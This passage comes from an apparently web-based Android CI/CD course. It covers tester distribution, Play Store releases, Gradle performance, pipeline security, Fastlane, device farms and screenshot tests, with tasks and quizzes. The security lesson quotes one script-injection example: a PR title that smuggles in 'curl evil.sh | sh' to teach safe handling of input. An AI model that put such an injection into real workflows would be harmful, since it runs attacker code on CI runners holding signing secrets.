  <li><code>./gradlew &lt;task&gt; --stacktrace --info</code> for detailed logs, or <code>--scan</code> for a shareable build report.</li>
  <li><strong>Re-run with debug logging</strong>: the "Re-run jobs → Enable debug logging" checkbox on a failed run.</li>
  <li><strong>Upload reports on failure</strong> with <code>if: failure()</code> so you can inspect them.</li>
  <li><strong>SSH into the runner</strong> to look around while it's live (only for private repos, because the session is accessible to anyone with the link):</li>
</ul>
<div class="code-block" data-lang="yaml" data-label="steps (temporary, for debugging only)">      - name: Debug session on failure
        if: failure()
        uses: mxschmitt/action-tmate@v3
        with:
          limit-access-to-actor: true</div>
<div class="callout tip">Keep a "CI failures" note in your team wiki: symptom → cause → fix. The same problems come back, and this note becomes one of the most useful documents your team has.</div>
`,
          tasks: [
            "Break your build in 3 different ways (permission, wrong JDK, failing test) and fix each one from the CI logs alone.",
            "Write a test that fails only in a different time zone, then make it time-zone-safe.",
            "Add timeout-minutes to every job in your workflows.",
            "Start a 'CI failures' note: symptom → cause → fix.",
          ],
          quiz: {
            q: "A test passes locally but fails in CI when formatting a date. What's the most likely cause?",
            options: [
              "GitHub Actions has a bug",
              "CI runs in a different time zone/locale (UTC, English)",
              "The test is too fast",
              "Gradle caching is disabled",
            ],
            answer: 1,
            explain: "Runners use UTC and an English locale. Tests should set an explicit time zone and locale, or inject a Clock.",
          },
        },
        {
          id: "distribution",
          title: "Distributing builds to testers",
          minutes: 20,
          summary: "Get every main-branch build into testers' hands automatically with Firebase App Distribution.",
          body: `
<h2>Why distribute automatically?</h2>
<p>Sharing APKs over chat doesn't scale. With automatic distribution, every merge to <code>main</code> reaches QA within minutes, along with release notes.</p>

<h2>Firebase App Distribution via Gradle</h2>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">plugins {
    id("com.google.firebase.appdistribution")
}

android {
    buildTypes {
        getByName("debug") {
            firebaseAppDistribution {
                groups = "qa-team"
                releaseNotes = System.getenv("RELEASE_NOTES") ?: "Local build"
            }
        }
    }
}</div>

<h2>Authenticate with a service account</h2>
<p>In Google Cloud, create a service account with the <em>Firebase App Distribution Admin</em> role, download its JSON key, and save the whole JSON as the <code>FIREBASE_SERVICE_ACCOUNT</code> secret.</p>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/distribute.yml">name: Distribute to QA
on:
  push:
    branches: [ main ]

jobs:
  distribute:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4

      - name: Write service account
        run: echo '\${{ secrets.FIREBASE_SERVICE_ACCOUNT }}' > \${{ runner.temp }}/sa.json

      - name: Build & upload
        env:
          GOOGLE_APPLICATION_CREDENTIALS: \${{ runner.temp }}/sa.json
          RELEASE_NOTES: \${{ github.event.head_commit.message }}
        run: ./gradlew assembleDebug appDistributionUploadDebug</div>
<div class="callout tip">🎓 <strong>Mid-level milestone:</strong> you now have PR checks, emulator tests, signed releases from tags, and automatic tester builds. That covers the majority of real-world Android CI setups.</div>
`,
          tasks: [
            "Create a Firebase project and add your app.",
            "Set up the service account secret.",
            "Merge something to main and receive the build on your phone via the Firebase tester app.",
          ],
          quiz: {
            q: "Why use a service account instead of your personal Firebase login in CI?",
            options: [
              "It's the only way Gradle works",
              "It has limited, revocable permissions and isn't tied to a person",
              "It's faster",
              "Personal accounts can't use Firebase",
            ],
            answer: 1,
            explain: "Least privilege: a service account can do only what CI needs and can be rotated without affecting anyone.",
          },
        },
      ],
    },

    // =====================================================================
    {
      id: "senior",
      title: "Senior",
      tagline: "Release automation, build performance, security and pipeline design at scale.",
      color: "var(--l4)",
      lessons: [
        {
          id: "play-store-release",
          title: "Automated Play Store releases",
          minutes: 30,
          summary: "Push a tag and let CI build, sign and upload to a Play track, then promote with staged rollouts.",
          body: `
<h2>Options</h2>
<ul>
  <li><strong>Gradle Play Publisher</strong> (<code>com.github.triplet.play</code>): publishing from Gradle tasks.</li>
  <li><strong>Fastlane</strong> (<code>supply</code>): Ruby-based, popular when you also ship iOS.</li>
  <li><strong>r0adkll/upload-google-play</strong>: a simple GitHub Action that uploads an already-built AAB.</li>
</ul>

<h2>Upload with a GitHub Action</h2>
<div class="code-block" data-lang="yaml" data-label="steps (after building the signed AAB)">      - name: Upload to Play (internal track)
        uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.example.myapp
          releaseFiles: app/build/outputs/bundle/release/app-release.aab
          track: internal
          status: completed
          whatsNewDirectory: distribution/whatsnew
          mappingFile: app/build/outputs/mapping/release/mapping.txt</div>

<h2>A sane release flow</h2>
<ol>
  <li>A merge to <code>main</code> uploads to the <strong>internal</strong> track automatically.</li>
  <li>A <code>v*</code> tag uploads to <strong>closed testing (beta)</strong>.</li>
  <li>A manual <code>workflow_dispatch</code>, behind an <strong>Environment approval</strong>, promotes to <strong>production</strong> with a staged rollout (for example 5% → 20% → 100%).</li>
</ol>
<h3>Require a human approval for production</h3>
<div class="code-block" data-lang="yaml" data-label="job">  promote-production:
    runs-on: ubuntu-latest
    environment: production     # configure required reviewers in Settings → Environments
    steps:
      - uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.example.myapp
          releaseFiles: app-release.aab
          track: production
          status: inProgress
          userFraction: 0.05</div>
<div class="callout tip">Always upload the R8 <code>mapping.txt</code> with each release, or crash stack traces in Play Console will be obfuscated and useless.</div>
<div class="callout warn">The first upload of a brand-new app must be done manually in Play Console. The API only works once the app exists.</div>
`,
          tasks: [
            "Create a Play Console service account and grant it release permissions.",
            "Automate upload to the internal track.",
            "Set up a 'production' Environment with required reviewers.",
          ],
          quiz: {
            q: "What's the safest way to release to production from CI?",
            options: [
              "Upload 100% on every merge to main",
              "Staged rollout behind a manual approval gate",
              "Only release from a developer's laptop",
              "Disable CI for releases",
            ],
            answer: 1,
            explain: "Approval gates plus staged rollouts limit the blast radius and give you time to halt a bad release.",
          },
        },
        {
          id: "build-performance",
          title: "Gradle build performance at scale",
          minutes: 30,
          summary: "In big projects, CI time is money and developer focus. Learn to measure and cut it systematically.",
          body: `
<h2>Measure first</h2>
<ul>
  <li><code>./gradlew assembleDebug --scan</code> gives you a free Build Scan with a timeline, cache misses and slow tasks.</li>
  <li><code>--profile</code> writes a local HTML report.</li>
  <li>Track CI duration over time (p50 / p90), not just single runs.</li>
</ul>

<h2>Biggest levers (roughly in order)</h2>
<ol>
  <li><strong>Configuration cache.</strong> It skips the configuration phase entirely on cache hits. Fix any incompatible plugins.</li>
  <li><strong>Remote build cache.</strong> CI populates it and every developer and CI run reuses task outputs. Self-host one, or use Develocity, Gradle's commercial service.</li>
  <li><strong>Avoid unnecessary work.</strong> Run <code>testDebugUnitTest</code> instead of <code>test</code>, use <code>lintDebug</code>, and don't build release variants on PRs.</li>
  <li><strong>Modularization.</strong> Smaller modules mean better parallelism and more cache hits.</li>
  <li><strong>Non-transitive R classes</strong> and avoiding unneeded <code>kapt</code> (move to KSP).</li>
  <li><strong>Bigger runners</strong> for the critical path, when the cost is justified.</li>
</ol>

<h2>Remote build cache config</h2>
<div class="code-block" data-lang="kotlin" data-label="settings.gradle.kts">buildCache {
    local { isEnabled = !System.getenv("CI").toBoolean() }
    remote<HttpBuildCache> {
        url = uri("https://cache.example.com/cache/")
        isPush = System.getenv("CI").toBoolean()   // only CI writes
        credentials {
            username = System.getenv("CACHE_USER")
            password = System.getenv("CACHE_PASSWORD")
        }
    }
}</div>

<h2>Only test what changed</h2>
<p>In a big multi-module repo, a change to <code>:feature:profile</code> shouldn't run the tests for <code>:feature:checkout</code>. "Affected module" detection compares the changed files against the module dependency graph. Tools like the <em>Dropbox affected-module-detector</em> plugin do this. Always run everything on <code>main</code> as a safety net.</p>
<div class="callout tip">A good target: PR feedback in <strong>under 10 minutes</strong>. Beyond that, developers context-switch and productivity drops.</div>
`,
          tasks: [
            "Run a Build Scan of your CI build and find the 3 slowest tasks.",
            "Enable configuration cache and fix any problems it reports.",
            "Write down your CI p50 duration and set a target.",
          ],
          quiz: {
            q: "In a remote build cache setup, who should usually PUSH (write) to the cache?",
            options: ["Every developer", "Only CI", "Nobody", "Only the release manager"],
            answer: 1,
            explain: "CI builds are clean and reproducible. Letting local machines write risks poisoning the cache with inconsistent outputs.",
          },
        },
        {
          id: "security",
          title: "Securing your pipeline",
          minutes: 25,
          summary: "Your CI can sign and publish your app, which makes it a prime attack target. Lock it down.",
          body: `
<h2>Least-privilege tokens</h2>
<p>Set the default <code>GITHUB_TOKEN</code> permissions to read-only and grant more per job only when needed:</p>
<div class="code-block" data-lang="yaml" data-label="top of workflow">permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write   # only this job can create GitHub releases</div>

<h2>Pin third-party actions</h2>
<p>A tag like <code>@v2</code> can be moved by whoever controls that repo. For third-party actions, pin to a full commit SHA, and let Dependabot keep the pins updated:</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - uses: reactivecircus/android-emulator-runner@<full-40-char-commit-sha> # v2.x</div>
<div class="code-block" data-lang="yaml" data-label=".github/dependabot.yml">version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
  - package-ecosystem: gradle
    directory: /
    schedule: { interval: weekly }</div>

<h2>Verify what you download</h2>
<ul>
  <li><strong>Gradle wrapper validation</strong>: <code>gradle/actions/setup-gradle</code> validates wrapper JARs automatically. You can also use <code>gradle/actions/wrapper-validation</code>.</li>
  <li><strong>Dependency verification</strong>: <code>./gradlew --write-verification-metadata sha256</code> creates checksums for every dependency.</li>
  <li><strong>Dependency review</strong> on PRs (<code>actions/dependency-review-action</code>) flags known-vulnerable libraries.</li>
</ul>

<h2>Dangerous patterns to avoid</h2>
<ul>
  <li>❌ <code>pull_request_target</code> combined with checking out the PR's code, which runs untrusted code with your secrets.</li>
  <li>❌ Interpolating user input directly into <code>run:</code>, for example a PR title. Pass it through <code>env:</code> instead.</li>
  <li>❌ Printing secrets, or writing them to files that get uploaded as artifacts.</li>
  <li>✅ Prefer <strong>OIDC / Workload Identity Federation</strong> to long-lived JSON keys for Google Cloud when possible.</li>
</ul>
<div class="code-block" data-lang="yaml" data-label="script injection: bad vs good">      # BAD: a PR title like  "; curl evil.sh | sh"  becomes code
      - run: echo "\${{ github.event.pull_request.title }}"

      # GOOD
      - env:
          TITLE: \${{ github.event.pull_request.title }}
        run: echo "$TITLE"</div>
`,
          tasks: [
            "Add a top-level permissions: contents: read to every workflow.",
            "Enable Dependabot for github-actions and gradle.",
            "Audit your workflows for direct \${{ github.event.* }} usage inside run: blocks.",
          ],
          quiz: {
            q: "Why pin third-party actions to a commit SHA?",
            options: [
              "SHAs run faster",
              "Tags can be moved to malicious code; a SHA is immutable",
              "GitHub requires it",
              "It enables caching",
            ],
            answer: 1,
            explain: "Supply chain attacks have hijacked action tags before. A full SHA guarantees you run exactly the code you reviewed.",
          },
        },
        {
          id: "pipeline-design",
          title: "Pipeline architecture & reuse",
          minutes: 25,
          summary: "Stop copy-pasting YAML. Design pipelines with stages, reusable workflows and composite actions.",
          body: `
<h2>Shape of a mature Android pipeline</h2>
<ol>
  <li><strong>Fast gate</strong> (under 3 min): compile, ktlint/detekt, unit tests for affected modules.</li>
  <li><strong>Deep checks</strong> (in parallel): Android Lint, instrumented tests on Gradle Managed Devices, screenshot tests.</li>
  <li><strong>On main</strong>: full test suite, distribute to QA, upload to the internal track.</li>
  <li><strong>Nightly</strong>: full device matrix, benchmarks, dependency updates.</li>
  <li><strong>Release</strong>: tag → beta → approved production rollout.</li>
</ol>

<h2>Composite action: share setup steps</h2>
<div class="code-block" data-lang="yaml" data-label=".github/actions/setup-android/action.yml">name: Setup Android build
description: Checkout-independent JDK + Gradle setup
runs:
  using: composite
  steps:
    - uses: actions/setup-java@v4
      with: { distribution: temurin, java-version: 17 }
    - uses: gradle/actions/setup-gradle@v4</div>
<div class="code-block" data-lang="yaml" data-label="usage in any job">    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-android
      - run: ./gradlew testDebugUnitTest</div>

<h2>Reusable workflow: share whole jobs</h2>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/gradle-task.yml">on:
  workflow_call:
    inputs:
      task: { required: true, type: string }

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-android
      - run: ./gradlew \${{ inputs.task }}</div>
<div class="code-block" data-lang="yaml" data-label="caller workflow">jobs:
  unit:
    uses: ./.github/workflows/gradle-task.yml
    with: { task: testDebugUnitTest }
  lint:
    uses: ./.github/workflows/gradle-task.yml
    with: { task: lintDebug }</div>

<h2>Dealing with flaky tests</h2>
<ul>
  <li>Track them: record every test failure that passes on retry.</li>
  <li>Quarantine: move known-flaky tests to a non-blocking job, and fix or delete them within an agreed time.</li>
  <li>Never just "re-run until green". It trains the team to ignore red builds.</li>
</ul>
`,
          tasks: [
            "Extract your JDK + Gradle setup into a composite action.",
            "Convert one job into a reusable workflow.",
            "Draw your ideal pipeline (fast gate → deep checks → main → release).",
          ],
          quiz: {
            q: "What's the main purpose of a 'fast gate' stage?",
            options: [
              "Deploy faster to production",
              "Give developers quick feedback on the most common failures",
              "Skip tests",
              "Run only on weekends",
            ],
            answer: 1,
            explain: "Most failures are compile, lint or unit test issues. Catching those in a couple of minutes keeps developers in flow.",
          },
        },
        {
          id: "quality-observability",
          title: "Quality gates & CI observability",
          minutes: 25,
          summary: "Senior engineers treat CI as a product: measure it, guard quality automatically, and keep it healthy.",
          body: `
<h2>Automated quality gates</h2>
<ul>
  <li><strong>Code coverage</strong> with <strong>Kover</strong> (JetBrains) or JaCoCo. Fail when coverage drops on changed code, rather than chasing a global number.</li>
  <li><strong>Screenshot tests</strong> (Roborazzi, Paparazzi, or Compose Preview Screenshot Testing) catch UI regressions on the JVM.</li>
  <li><strong>APK/AAB size check</strong>: fail or warn if size grows by more than X KB versus <code>main</code>.</li>
  <li><strong>Baseline Profiles</strong> and <strong>Macrobenchmark</strong> track startup time on a nightly job.</li>
  <li><strong>Binary compatibility</strong> for libraries (the Kotlin binary-compatibility-validator).</li>
</ul>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts (Kover)">plugins { id("org.jetbrains.kotlinx.kover") version "0.9.1" }

kover {
    reports {
        verify {
            rule { minBound(70) }   // fail under 70% line coverage
        }
    }
}
// CI: ./gradlew koverVerify koverXmlReport</div>

<h2>Write a job summary</h2>
<p>Anything written to <code>$GITHUB_STEP_SUMMARY</code> appears as Markdown on the run page:</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - name: APK size summary
        run: |
          SIZE=$(du -k app/build/outputs/apk/release/*.apk | cut -f1)
          echo "### 📦 APK size: \${SIZE} KB" >> "$GITHUB_STEP_SUMMARY"</div>

<h2>Metrics worth tracking</h2>
<ul>
  <li><strong>PR feedback time</strong> (p50 / p90)</li>
  <li><strong>Success rate on main</strong> (it should be close to 100%)</li>
  <li><strong>Flaky test rate</strong></li>
  <li><strong>Cache hit rate</strong></li>
  <li><strong>Cost</strong>: runner minutes per month</li>
</ul>
<p>The DORA metrics (deployment frequency, lead time, change failure rate, time to restore) connect CI health to business outcomes.</p>
<div class="callout tip">🏆 <strong>Senior milestone:</strong> you can design, secure, speed up and measure an Android CI/CD system, and explain the trade-offs to your team. Now teach someone else, which is the real senior skill.</div>
`,
          tasks: [
            "Add Kover and a coverage verify rule.",
            "Add a job summary with APK size and test counts.",
            "Pick 3 CI metrics and check them monthly.",
            "Capstone: rebuild a complete pipeline for a new project from scratch without looking at notes.",
          ],
          quiz: {
            q: "Which metric best reflects developer experience with CI?",
            options: ["Number of workflow files", "PR feedback time (p50/p90)", "Lines of YAML", "Number of runners"],
            answer: 1,
            explain: "How long developers wait for a green or red signal directly affects focus and throughput.",
          },
        },
      ],
    },

    // =====================================================================
    {
      id: "specializations",
      title: "Specializations",
      tagline: "Beyond senior: other CI tools, device farms, scale, release health and KMP.",
      color: "var(--l5)",
      lessons: [
        {
          id: "other-ci-tools",
          title: "Other CI tools: GitLab, Bitrise, Jenkins",
          minutes: 25,
          summary: "Same concepts, different syntax. Learn to translate a pipeline between the CI tools you'll meet at work.",
          body: `
<h2>Concept translation table</h2>
<div style="overflow-x:auto">
<table class="table">
  <tr><th>Concept</th><th>GitHub Actions</th><th>GitLab CI</th><th>Bitrise</th><th>Jenkins</th></tr>
  <tr><td>Config file</td><td><code>.github/workflows/*.yml</code></td><td><code>.gitlab-ci.yml</code></td><td><code>bitrise.yml</code></td><td><code>Jenkinsfile</code></td></tr>
  <tr><td>Unit of work</td><td>job → steps</td><td>stage → job → script</td><td>workflow → steps</td><td>stage → steps</td></tr>
  <tr><td>Machine</td><td>runner</td><td>runner (+ Docker image)</td><td>stack</td><td>agent / node</td></tr>
  <tr><td>Secrets</td><td>Secrets</td><td>CI/CD variables (masked)</td><td>Secrets</td><td>Credentials plugin</td></tr>
  <tr><td>Files kept</td><td>upload-artifact</td><td><code>artifacts:</code></td><td>deploy-to-bitrise-io</td><td><code>archiveArtifacts</code></td></tr>
</table>
</div>

<h2>GitLab CI</h2>
<p>GitLab jobs run inside a Docker image, so pick one that already contains the Android SDK:</p>
<div class="code-block" data-lang="yaml" data-label=".gitlab-ci.yml">image: ghcr.io/cirruslabs/android-sdk:34

stages: [ check, build ]

variables:
  GRADLE_USER_HOME: "$CI_PROJECT_DIR/.gradle"

cache:
  key: gradle-$CI_COMMIT_REF_SLUG
  paths: [ .gradle/caches, .gradle/wrapper ]

unit-tests:
  stage: check
  script: ./gradlew testDebugUnitTest
  artifacts:
    when: always
    reports:
      junit: "**/build/test-results/**/*.xml"

assemble:
  stage: build
  script: ./gradlew assembleDebug
  artifacts:
    paths: [ app/build/outputs/apk/debug/ ]
    expire_in: 1 week</div>

<h2>Bitrise</h2>
<p>Bitrise is a mobile-focused hosted CI. Most configuration is done in its visual workflow editor using ready-made <em>steps</em> (for example "Android Build", "Android Unit Test" and "Google Play Deploy"), which are saved to <code>bitrise.yml</code>. It's popular with agencies and teams that want little setup and macOS machines for iOS.</p>

<h2>Jenkins</h2>
<p>Jenkins is self-hosted and highly customizable, so you'll find it in older enterprise setups. You maintain the servers, the plugins and the Android SDK yourself.</p>
<div class="code-block" data-lang="groovy" data-label="Jenkinsfile">pipeline {
    agent { docker { image 'ghcr.io/cirruslabs/android-sdk:34' } }
    options { timeout(time: 30, unit: 'MINUTES') }
    stages {
        stage('Test')  { steps { sh './gradlew testDebugUnitTest' } }
        stage('Build') { steps { sh './gradlew assembleDebug' } }
    }
    post {
        always { junit '**/build/test-results/**/*.xml' }
        success { archiveArtifacts 'app/build/outputs/apk/debug/*.apk' }
    }
}</div>
<div class="callout tip">Keep logic in Gradle tasks and scripts, and keep CI YAML thin. Then switching CI tools means rewriting 50 lines of config, not your whole build.</div>
`,
          tasks: [
            "Translate your GitHub Actions workflow to .gitlab-ci.yml (on paper or in a free GitLab project).",
            "List which parts of your pipeline are tool-specific and which are plain Gradle commands.",
          ],
          quiz: {
            q: "What's the best way to make a pipeline easy to move to another CI tool?",
            options: [
              "Use as many marketplace actions as possible",
              "Keep logic in Gradle tasks/scripts and keep CI config thin",
              "Write everything in one huge YAML file",
              "Avoid running tests",
            ],
            answer: 1,
            explain: "Gradle commands work anywhere. CI-specific glue is the only part you'll need to rewrite.",
          },
        },
        {
          id: "self-hosted-runners",
          title: "Self-hosted runners",
          minutes: 20,
          summary: "Run CI jobs on your own machines for more power, lower cost at scale, or special hardware, and know the risks.",
          body: `
<h2>When it makes sense</h2>
<ul>
  <li>You use thousands of CI minutes per month and hosted runners get expensive.</li>
  <li>You need more CPU/RAM, faster emulators, or physical devices plugged in.</li>
  <li>You need access to private networks (internal Maven repos, test servers).</li>
</ul>
<p><strong>When it doesn't:</strong> small teams. You now maintain machines, updates, disk cleanup and security. Try <em>larger GitHub-hosted runners</em> first.</p>

<h2>Using one</h2>
<p>Register a machine in <em>Settings → Actions → Runners → New self-hosted runner</em>, give it labels, and target those labels:</p>
<div class="code-block" data-lang="yaml" data-label="job">  instrumented-tests:
    runs-on: [ self-hosted, linux, x64, android-emulator ]</div>

<h2>Do it properly</h2>
<ul>
  <li><strong>Ephemeral runners</strong>: a fresh VM or container per job (<code>--ephemeral</code> flag), so state from one job can't leak into the next.</li>
  <li><strong>Autoscaling</strong>: <em>Actions Runner Controller (ARC)</em> runs runners as Kubernetes pods that scale with the queue.</li>
  <li><strong>Pre-baked images</strong> with the JDK, Android SDK and emulator images already installed save minutes per job.</li>
  <li><strong>Monitor disk and health</strong>, and clean <code>~/.gradle</code> and build folders regularly.</li>
</ul>
<div class="callout warn">Never use self-hosted runners on <strong>public</strong> repositories. Anyone can open a pull request that runs arbitrary code on your machine and your network.</div>
`,
          tasks: [
            "Estimate your monthly CI minutes and cost on hosted runners.",
            "Register a self-hosted runner on a spare machine or VM (private repo) and run one job on it.",
          ],
          quiz: {
            q: "Why are ephemeral self-hosted runners recommended?",
            options: [
              "They're cheaper to buy",
              "Each job starts clean, so no state or secrets leak between jobs",
              "They don't need an operating system",
              "GitHub requires them",
            ],
            answer: 1,
            explain: "Persistent runners accumulate state, caches and potential compromises. Ephemeral ones reset after every job.",
          },
        },
        {
          id: "fastlane",
          title: "Fastlane for Android",
          minutes: 25,
          summary: "Fastlane wraps building, testing and publishing into named 'lanes' that run the same on a laptop and in CI.",
          body: `
<h2>Why teams use it</h2>
<ul>
  <li>One tool for <strong>Android and iOS</strong> releases.</li>
  <li>Manages Play Store metadata: screenshots, descriptions and changelogs live in Git.</li>
  <li>The same lane runs locally and in any CI tool.</li>
</ul>

<h2>Setup</h2>
<div class="code-block" data-lang="bash" data-label="terminal">gem install bundler
bundle init && bundle add fastlane
bundle exec fastlane init       # creates fastlane/Appfile + Fastfile
bundle exec fastlane supply init  # download existing Play metadata (needs service account)</div>

<h2>A Fastfile with three lanes</h2>
<div class="code-block" data-lang="ruby" data-label="fastlane/Fastfile">default_platform(:android)

platform :android do
  desc "Run unit tests"
  lane :test do
    gradle(task: "testDebugUnitTest")
  end

  desc "Send a build to testers"
  lane :beta do
    gradle(task: "assembleRelease")
    firebase_app_distribution(
      app: ENV["FIREBASE_APP_ID"],
      groups: "qa-team",
      release_notes: last_git_commit[:message]
    )
  end

  desc "Upload to Play internal track"
  lane :deploy do
    gradle(task: "bundleRelease")
    upload_to_play_store(track: "internal", json_key_data: ENV["PLAY_JSON_KEY"])
  end
end</div>
<p>The <code>firebase_app_distribution</code> action comes from a plugin: <code>bundle exec fastlane add_plugin firebase_app_distribution</code>.</p>

<h2>Calling lanes from GitHub Actions</h2>
<div class="code-block" data-lang="yaml" data-label="steps">      - uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.3'
          bundler-cache: true     # caches installed gems
      - name: Deploy
        env:
          PLAY_JSON_KEY: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
        run: bundle exec fastlane deploy</div>
<div class="callout tip">Commit <code>Gemfile.lock</code> so every machine uses the exact same Fastlane version.</div>
`,
          tasks: [
            "Install Fastlane with Bundler in your project.",
            "Create a 'test' and a 'beta' lane and run them locally.",
            "Call one lane from your GitHub Actions workflow.",
          ],
          quiz: {
            q: "What's a key benefit of Fastlane lanes?",
            options: [
              "They replace Gradle",
              "The same release steps run identically locally and on any CI tool",
              "They make the app smaller",
              "They only work on macOS",
            ],
            answer: 1,
            explain: "Lanes package the release process so it isn't locked into one CI tool's YAML.",
          },
        },
        {
          id: "device-farms",
          title: "Device farms: Firebase Test Lab",
          minutes: 25,
          summary: "One emulator isn't your users. Run tests on many real devices and Android versions in the cloud.",
          body: `
<h2>Why a device farm?</h2>
<p>Bugs often appear only on specific manufacturers, screen sizes or Android versions. Device farms like <strong>Firebase Test Lab</strong>, BrowserStack and AWS Device Farm give you real phones on demand.</p>

<h2>Running instrumented tests on Test Lab</h2>
<p>Build both APKs, authenticate to Google Cloud (OIDC is preferred, see the security lesson), then call <code>gcloud</code>:</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - run: ./gradlew assembleDebug assembleDebugAndroidTest

      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: \${{ secrets.GCP_WIF_PROVIDER }}
          service_account: \${{ secrets.GCP_SERVICE_ACCOUNT }}

      - uses: google-github-actions/setup-gcloud@v2

      - name: Run tests on Firebase Test Lab
        run: |
          gcloud firebase test android run \\
            --type instrumentation \\
            --app app/build/outputs/apk/debug/app-debug.apk \\
            --test app/build/outputs/apk/androidTest/debug/app-debug-androidTest.apk \\
            --device model=oriole,version=33 \\
            --device model=a51,version=31 \\
            --timeout 15m</div>
<p>(The <code>id-token: write</code> permission must be set on the job for OIDC to work.)</p>

<h2>Robo tests: no test code needed</h2>
<p><code>--type robo</code> crawls your app automatically and reports crashes. It's a cheap smoke test for every release candidate.</p>

<h2>Scaling up with sharding</h2>
<p>Large suites can be split across devices in parallel with <code>--num-uniform-shards</code>, or with <strong>Flank</strong>, an open-source runner that shards smartly based on test durations.</p>
<div class="callout tip">Device farm time costs money. Run the full device matrix nightly or for release candidates, not on every PR.</div>
`,
          tasks: [
            "Enable Firebase Test Lab in your Firebase project (it has a free daily quota).",
            "Run a Robo test on your APK from the gcloud CLI.",
            "Add a nightly workflow (on: schedule) that runs instrumented tests on 2 devices.",
          ],
          quiz: {
            q: "When should the full real-device matrix typically run?",
            options: [
              "On every commit to every branch",
              "Nightly or for release candidates",
              "Never: emulators are enough",
              "Only after users report bugs",
            ],
            answer: 1,
            explain: "Device farms are slower and cost money. Use them where they add the most value, before releases.",
          },
        },
        {
          id: "screenshot-testing",
          title: "Screenshot testing in depth",
          minutes: 25,
          summary: "Catch visual regressions automatically by comparing UI screenshots against approved 'golden' images.",
          body: `
<h2>How it works</h2>
<ol>
  <li><strong>Record</strong>: render screens or composables and save them as golden PNGs, committed to Git.</li>
  <li><strong>Verify</strong>: in CI, render again and compare pixel by pixel. Differences fail the build.</li>
  <li><strong>Review</strong>: if a change is intended, re-record and commit the new goldens in the same PR.</li>
</ol>

<h2>Tools</h2>
<ul>
  <li><strong>Roborazzi</strong> runs on the JVM with Robolectric. It's fast, needs no emulator, and supports Compose and Views.</li>
  <li><strong>Paparazzi</strong> (Cash App) runs on the JVM with layoutlib, the Android Studio preview renderer.</li>
  <li><strong>Compose Preview Screenshot Testing</strong> is Google's tool, and turns your <code>@Preview</code>s into tests.</li>
</ul>

<h2>Roborazzi example</h2>
<div class="code-block" data-lang="kotlin" data-label="app/src/test/.../LoginScreenshotTest.kt">@RunWith(AndroidJUnit4::class)
@GraphicsMode(GraphicsMode.Mode.NATIVE)
@Config(qualifiers = "w411dp-h891dp-xxhdpi")
class LoginScreenshotTest {
    @get:Rule val composeRule = createComposeRule()

    @Test
    fun loginScreen_default() {
        composeRule.setContent { AppTheme { LoginScreen() } }
        composeRule.onRoot().captureRoboImage()
    }
}</div>
<div class="code-block" data-lang="bash" data-label="terminal">./gradlew recordRoborazziDebug   # create/update goldens
./gradlew verifyRoborazziDebug   # CI: fail on differences
./gradlew compareRoborazziDebug  # generate diff images</div>
<div class="code-block" data-lang="yaml" data-label="steps">      - run: ./gradlew verifyRoborazziDebug
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: screenshot-diffs
          path: '**/build/outputs/roborazzi/'</div>

<h2>Pitfalls</h2>
<ul>
  <li><strong>Rendering differs between operating systems</strong> (fonts, anti-aliasing). Record goldens on the same OS as CI (Linux), for example with a manual "record" workflow that commits the results.</li>
  <li>Use <strong>Git LFS</strong> for goldens if you have hundreds of images.</li>
  <li>Freeze dynamic content like dates, animations and random data.</li>
</ul>
`,
          tasks: [
            "Add Roborazzi (or Paparazzi) and record goldens for 2 screens.",
            "Change a color, run verify, and inspect the diff image.",
            "Add verify to CI and upload diffs on failure.",
          ],
          quiz: {
            q: "Why should goldens be recorded on the same OS as CI?",
            options: [
              "It's a license requirement",
              "Font rendering and anti-aliasing differ between OSes, causing false failures",
              "Linux PNGs are smaller",
              "macOS can't run screenshot tests",
            ],
            answer: 1,
            explain: "Tiny pixel differences between platforms would make every comparison fail even when nothing changed.",
          },
        },
        {
          id: "large-scale",
          title: "Very large codebases & merge queues",
          minutes: 25,
          summary: "With hundreds of modules and dozens of engineers merging daily, you need different tools and strategies.",
          body: `
<h2>Problems that appear at scale</h2>
<ul>
  <li>A full build takes 30+ minutes even with caching.</li>
  <li>PRs that pass alone break <code>main</code> when merged together ("semantic conflicts").</li>
  <li>Test suites grow until running everything on every PR is impossible.</li>
</ul>

<h2>Merge queues</h2>
<p>A merge queue tests each PR <em>combined with the PRs ahead of it</em> before merging, so <code>main</code> stays green. On GitHub, enable it in branch rules and add the <code>merge_group</code> trigger:</p>
<div class="code-block" data-lang="yaml" data-label="on:">on:
  pull_request:
  merge_group:      # runs CI for PRs waiting in the merge queue</div>

<h2>Develocity (Gradle Enterprise)</h2>
<p>Develocity is Gradle's commercial platform, used by most large Android companies:</p>
<ul>
  <li><strong>Remote build cache</strong> with high-performance cache nodes.</li>
  <li><strong>Build Scans for every build</strong>, with trends and failure analytics across the team.</li>
  <li><strong>Test Distribution</strong>: spreads tests across many agents.</li>
  <li><strong>Predictive Test Selection</strong>: uses machine learning to skip tests that are very unlikely to fail for a given change.</li>
</ul>

<h2>Bazel</h2>
<p>Some very large companies build Android with <strong>Bazel</strong> (<code>rules_android</code>, <code>rules_kotlin</code>) instead of Gradle. It offers strict, hermetic builds and powerful remote execution, but it's a big migration with weaker Android Studio integration. Know it exists. Almost every team should stay on Gradle.</p>

